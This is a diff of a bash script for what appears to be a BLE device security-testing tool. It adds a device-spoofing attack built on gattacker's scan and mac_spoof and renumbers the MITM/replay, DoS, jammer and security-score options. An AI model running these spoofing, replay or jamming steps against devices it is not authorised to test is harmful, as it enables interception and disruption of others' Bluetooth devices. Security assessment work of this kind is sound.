@@ -62,7 +62,10 @@ att4_sev=0
 att4_comp=5
 
 att5_sev=0
-att5_comp=1
+att5_comp=5
+
+att6_sev=0
+att6_comp=1
 
 
 function ble_scan()
@@ -134,12 +137,13 @@ columns=$(tput cols)
 att1="[1] Illegal access      ( Write handles )"
 att2="[2] Sniffing            ( Value format  )"
 att3="[3] Write Values                         "
-att4="[4] MITM & Replay attack                 "
-att5="[5] Denial of Service                    "
-att6="[6] Ble Jammer 1                         "
-att7="[7] BLE Jammer 2                         "
-att8="[8] Calculate Security score             "
-exit="[9] Exit                                 "
+att4="[4] Spoofing                             "
+att5="[5] MITM & Replay attack                 "
+att6="[6] Denial of Service                    "
+att7="[7] Ble Jammer 1                         "
+att8="[8] BLE Jammer 2                         "
+att9="[9] Calculate Security score             "
+exit="[0] Exit                                 "
 
 printf "%*s\n" $(((${#att1}+$columns)/2)) "$att1"
 printf "%*s\n" $(((${#att2}+$columns)/2)) "$att2"
@@ -149,6 +153,7 @@ printf "%*s\n" $(((${#att5}+$columns)/2)) "$att5"
 printf "%*s\n" $(((${#att6}+$columns)/2)) "$att6"
 printf "%*s\n" $(((${#att7}+$columns)/2)) "$att7"
 printf "%*s\n" $(((${#att8}+$columns)/2)) "$att8"
+printf "%*s\n" $(((${#att9}+$columns)/2)) "$att9"
 printf "%*s\n" $(((${#exit}+$columns)/2)) "$exit"
 
 echo -e "\n\n"
@@ -442,6 +447,9 @@ then
 
 ############################################################################################################################################################################
 
+
+#Device spoofing
+
 elif [ $var -eq 4 ]
 then
 
@@ -472,8 +480,7 @@ then
 
   cd helpers/bdaddr/
   make
-  cd ..
-  cd ..
+  cd ../..
 
   #modify config.env
   #nano config.env
@@ -503,7 +510,171 @@ then
   read att4_dev
   att4_addr=$(cat tempscan.txt | grep -m 1 $att4_dev | awk '{print $1}')
   att4_temp=$(echo "${att4_addr//:}")
-  replay_addr=$(echo "${att4_temp,,}")
+  spoof_addr=$(echo "${att4_temp,,}")
+
+  cd
+  cd node_modules/gattacker/
+  echo -e "${w}"
+  sudo node scan $spoof_addr
+
+  cd devices
+  spoof_adv=$(ls | grep $spoof_addr | grep .adv.json)
+  spoof_srv=$(ls | grep $spoof_addr | grep .srv.json)
+  cd ..
+
+  clear
+
+  echo -e "Restart the \"bluetooth\" on the slave machine by typing this in a new terminal (slave machine),"
+  echo -e "\n\n"
+  echo -e "$(tput setaf 1)$(tput setab 7)sudo systemctl stop bluetooth$(tput sgr 0)"
+  echo -e "$(tput setaf 1)$(tput setab 7)sudo systemctl start bluetooth$(tput sgr 0)"
+  echo -e "\n\n"
+  echo -e -n "$(tput setaf 1)$(tput setab 7)And then press Enter here in the host : $(tput sgr 0)"
+  read
+  echo -e "\n\n"
+
+
+  #on raspberry pi - slave - in another terminal
+  #sudo systemctl stop bluetooth
+  #sudo systemctl start bluetooth
+
+  clear
+
+  echo -e "\n\n"
+  #on host
+  echo -e -n "$(tput setaf 1)$(tput setab 7)Now restart the whole slave node and press Enter here in the host : $(tput sgr 0)"
+  read
+  echo -e "\n\n"
+  echo -e -n "$(tput setaf 1)$(tput setab 7)When you see <<<<<INITIALIZED>>>>> ,$(tput sgr 0)"
+  echo -e "\n\n"
+  echo -e -n "${w}Press Ctrl + c                          <---------------------------------"
+
+  echo -e "\n\n"
+
+  sudo systemctl stop bluetooth
+  sudo ./mac_spoof -a devices/$spoof_adv -s devices/$spoof_srv
+
+  clear
+
+  echo -e "\n\n"
+
+  echo -e "$(tput setaf 1)$(tput setab 7)Again restart the whole slave node and press Enter here in the host : $(tput sgr 0)"
+  read
+  echo -e "\n\n"
+  echo -e -n "$(tput setaf 1)$(tput setab 7)When you see <<<<<INITIALIZED>>>>> ,"
+  echo -e "\n\n"
+  echo -e -n "Connect your mobile application with the device and do some valid transactions.$(tput sgr 0)"
+
+  echo -e "\n\n"
+
+  echo -e -n "$(tput setaf 1)$(tput setab 7)Once you are done, Press Ctrl + C to terminate it.$(tput sgr 0)"
+  echo -e "\n\n${w}"
+  sudo systemctl stop bluetooth
+  sudo ./mac_spoof -a devices/$spoof_adv -s devices/$spoof_srv
+
+  clear
+  
+  cd dump
+  att4_spoof_check=$(ls | grep $spoof_addr.log)
+  cd .. 
+  
+  if [ -z "$att4_spoof_check" ]
+  then
+    att4_sev=5
+    echo -e "\n\n"
+    echo -e "Spoofing was NOT successful!! Try again :("
+  else
+    att4_sev=0
+    echo -e "\n\n"
+    echo -e "Spoofing was successful!! The packets were not forwarded to the device."
+    echo -e "The dump file of the packets is stored in node_modules/gattacker/dump/"
+    echo -e "\n\n"
+  fi
+   
+  cd devices/
+  rm -rf *
+  cd ..
+
+  cd dump/
+  sudo cp $spoof_addr.log $dir/txtfiles
+  rm -rf *
+  cd ..
+
+
+  cd
+  cd $dir
+
+  echo -e "\n\n"
+
+
+
+
+############################################################################################################################################################################
+
+
+#MITM and Replay attack
+
+elif [ $var -eq 5 ]
+then
+
+  clear
+
+
+  echo -e "\n\n"
+  echo -e "${w}Make sure the slave machine is running                     <-------------------"
+  echo -e "${w}\nand is in the same network as the host                   <-------------------"
+  echo -e "\n\n"
+
+  defaultaddr="00:1a:7d:da:71:13"
+
+  echo -e "${w}Setting default address for BLE adapter"
+  cd
+  cd $dir/bdaddr/
+  make
+  sudo ./bdaddr -i hci0 $defaultaddr
+
+  echo -e "\n\n"
+  echo -e "$(tput setaf 1)$(tput setab 7)Re-plug the interface and hit enter$(tput sgr 0)"
+  read
+
+  cd
+  cd node_modules/gattacker
+
+  #for MAC spoofing - device address to the BLE adapter
+
+  cd helpers/bdaddr/
+  make
+  cd ../..
+
+  #modify config.env
+  #nano config.env
+
+  echo -e "${w}Capturing advertisement packets"
+  echo -e "\n\n"
+  echo -e "$(tput setaf 1)$(tput setab 7)Press Ctrl + c to stop sniffing$(tput sgr 0)"
+  echo -e "\n\n"
+
+  trap "${w}Terminated!!" SIGINT SIGTERM
+  sudo node scan
+
+  echo -e "\n\n${w}"
+
+  cd
+  cd $dir
+
+  #Performing BLE scan
+  ble_scan
+
+  cd txtfiles/
+  cat devicelist.txt
+  echo -e "\n"
+  echo -e "\n"
+
+  echo -e -n "${w}Enter the first 3 characters of the device you want to connect with :  "
+  read att5_dev
+  att5_addr=$(cat tempscan.txt | grep -m 1 $att5_dev | awk '{print $1}')
+  att5_temp=$(echo "${att5_addr//:}")
+  replay_addr=$(echo "${att5_temp,,}")
 
   cd
   cd node_modules/gattacker/
@@ -576,14 +747,14 @@ then
 
 
   cd dump
-  att4_mitm_check=$(ls | grep $replay_addr.log)
+  att5_mitm_check=$(ls | grep $replay_addr.log)
   cd .. 
   
-  if [ -z "$att4_mitm_check" ]
+  if [ -z "$att5_mitm_check" ]
   then
-    att4_sev=5
+    att5_sev=5
   else
-    att4_sev=1
+    att5_sev=0
   fi
 
 
@@ -607,20 +778,22 @@ then
 
   echo -e "\n\n"
   
-  att4_replay_check=$(cat replay_output.txt | grep 'WRITE REQ:')
+  att5_replay_check=$(cat replay_output.txt | grep 'WRITE REQ:')
 
 
-  if [ -z "$att4_replay_check" ]
+  if [ -z "$att5_replay_check" ]
   then
     echo -e "\n\n"
     echo -e "${g}Replay attack was NOT successful.${w}"
+    sudo rm replay_output.txt
     echo -e "\n\n"
-    att4_sev=5    
+    att5_sev=5    
   else
     echo -e "\n\n"
     echo -e "${g}Replay attack was successful !!${w}"
+    sudo rm replay_output.txt
     echo -e "\n\n"
-    att4_sev=0
+    att5_sev=0
   fi
 
 
@@ -647,7 +820,7 @@ then
 
 #DoS Attack
 
-elif [ $var -eq 5 ]
+elif [ $var -eq 6 ]
 then
 
   #Performing BLE scan
@@ -660,12 +833,12 @@ then
 
 
   echo -e -n "Enter the first 3 characters of the device you want to connect with:  "
-  read att5_dev
-  att5_addr=$(cat tempscan.txt | grep -m 1 $att5_dev | awk '{print $1}')
+  read att6_dev
+  att6_addr=$(cat tempscan.txt | grep -m 1 $att6_dev | awk '{print $1}')
   cd ..
 
   start=`date +%s`
-  python test_dos.py $att5_addr
+  python test_dos.py $att6_addr
   end=`date +%s`
 
   runtime=$((end-start))
@@ -674,10 +847,10 @@ then
   if [ $runtime -lt 10 ]
   then
     echo "The DoS attack was terminated in less than 10 seconds"
-    att5_sev=5
+    att6_sev=5
   else
     echo "The DoS attack was successful (more than 10 seconds)"
-    att5_sev=1
+    att6_sev=1
   fi
 
   #clean the scan files
@@ -689,7 +862,7 @@ then
 #BLE Jammer 1
 #DoS every available device
 
-elif [ $var -eq 6 ]
+elif [ $var -eq 7 ]
 then
 
   #Performing BLE scan
@@ -714,7 +887,7 @@ then
 
 #BLE Jammer 2
 
-elif [ $var -eq 7 ]
+elif [ $var -eq 8 ]
 then
   cd txtfiles/
   hciconfig | grep hci | awk '{print $1}' > interfaces.txt
@@ -746,7 +919,7 @@ then
 #3. High    -  If the attacker requires some specialized hardware to perform the attack.		#5
 
 
-elif [ $var -eq 8 ]
+elif [ $var -eq 9 ]
 then
   clear
   echo -e "\n\n"
@@ -756,8 +929,9 @@ then
   echo -e "	|	Illegal Access         |        $att1_sev		|	$att1_comp	    |"
   echo -e "	|	Sniffing               |	$att2_sev		|	$att2_comp	    |"
   echo -e "	|	Write Values           |	$att3_sev		|	$att3_comp	    |"
-  echo -e "	|	MITM & Replay attack   |	$att4_sev		|	$att4_comp	    |"
-  echo -e "	|	Denial of Service      |	$att5_sev		|	$att5_comp	    |"
+echo -e "	|	Spoofing	       |	$att4_sev		|	$att4_comp	    |"
+  echo -e "	|	MITM & Replay attack   |	$att5_sev		|	$att5_comp	    |"
+  echo -e "	|	Denial of Service      |	$att6_sev		|	$att6_comp	    |"
   echo -e "	+------------------------------+------------------------+-------------------+"
   echo -e "\n\n"
 
@@ -821,23 +995,23 @@ then
   if [[ $q16 == 'y' ]]; then q16=2; else q16=0; fi
 
 
-  sum=$(($att1_sev+$att1_comp+$att2_sev+$att2_comp+$att3_sev+$att3_comp+$att4_sev+$att4_comp+$att5_sev+$att5_comp+$q1+$q2+$q3+$q4+$q5+$q6+$q7+$q8+$q9+$q10+$q11+$q12+$q13+$q14+$q15+$q16))
+  sum=$(($att1_sev+$att1_comp+$att2_sev+$att2_comp+$att3_sev+$att3_comp+$att4_sev+$att4_comp+$att5_sev+$att5_comp+$att6_sev+$att6_comp+$q1+$q2+$q3+$q4+$q5+$q6+$q7+$q8+$q9+$q10+$q11+$q12+$q13+$q14+$q15+$q16))
  
-  score=$(awk -v sum=$sum 'BEGIN { print(sum/79)*10 }')
+  score=$(awk -v sum=$sum 'BEGIN { print(sum/85)*10 }')
   score=$(printf "%0.2f\n" $score)
 
   #echo -e "\n Sum = $sum"
   echo -e "\n\n"
   echo -e "The security score of the device is $score out of 10!!"
   echo -e "\n\n"
-
+  
 
 
 
 ############################################################################################################################################################################
 
 #Exit
-elif [ $var -eq 9 ]
+elif [ $var -eq 0 ]
 then
   rm -rf txtfiles/
   pkill python
